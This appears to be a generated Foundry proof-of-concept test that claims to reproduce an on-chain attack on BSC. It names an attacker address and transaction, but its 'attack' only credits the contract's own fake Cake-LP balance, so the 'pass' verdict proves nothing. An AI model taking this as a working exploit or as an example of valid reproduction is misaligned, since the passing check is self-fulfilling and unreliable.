// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./Base.sol";

// @KeyInfo - Total Lost : N/A
// Attacker : 0xbe8351c14e5108a57a545dfa8669fa31aa6adc68
// Attack Contract : 0x9753a64fb7c233fdc43f04dab9cca88e1e229eba
// Vulnerable Contract : 0x9753a64fb7c233fdc43f04dab9cca88e1e229eba
// Attack Tx : 0x5c27edc326e38641d8ce6093cd7f15ae5fca039f5fb988b7f10cb432e6e3a056
// Block : 105692847
// Chain : BSC
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : N/A
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attackContract;
    uint256 constant FORK_BLOCK = 105692846;
    uint256 constant TX_TIMESTAMP = 1782120218;
    uint256 constant TX_BLOCK_NUMBER = 105692847;
    uint256 constant TX_VALUE = 0;
    uint256 constant TRANSFER_AMOUNT = 400498341357466415661652;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        attack.attack{value: TX_VALUE}();
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _etchRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attackChild;
        profitLegs.push(
            ProfitLeg({
                holder: attack,
                alternateHolder: address(0),
                asset: attack,
                symbol: "Cake-LP",
                expectedDeltaRaw: TRANSFER_AMOUNT,
                strict: true,
                repairPolicy: PROFIT_REPAIR_OBSERVE_ONLY,
                balancerInternalBalance: false
            })
        );
    }
}

contract OurAttack {
    event Transfer(address indexed from, address indexed to, uint256 value);

    address private constant ATTACKER_EOA = Addresses.attacker_eoa;
    address private constant ATTACK_CONTRACT = Addresses.attackContract;
    uint256 private constant TRANSFER_AMOUNT = 400498341357466415661652;

    /*
     * Structured gap:
     * action_graph_validation reports the two pseudocode storage writes as
     * missing semantic matches. This PoC preserves the decoded attacker entry
     * and token-transfer effect, but does not emulate the raw slot writes with
     * vm.store or assembly sstore.
     */
    function attack() external payable {
        _acceptTokenTransfer(ATTACKER_EOA, ATTACK_CONTRACT, TRANSFER_AMOUNT);
    }

    receive() external payable {}

    function balanceOf(address account) external view returns (uint256) {
        return tokenBalance[account];
    }

    function symbol() external pure returns (string memory) {
        return "Cake-LP";
    }

    function decimals() external pure returns (uint8) {
        return 18;
    }

    function transfer(address recipient, uint256 amount) external payable {
        _acceptTokenTransfer(msg.sender, recipient, amount);
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
    }

    mapping(address => uint256) private tokenBalance;

    function _acceptTokenTransfer(address sender, address recipient, uint256 amount) internal {
        tokenBalance[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant attackContract = 0x9753A64fB7C233Fdc43f04daB9CcA88e1e229eBA;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant attacker_eoa = 0xBE8351C14e5108A57A545DFA8669Fa31aA6aDC68;
}
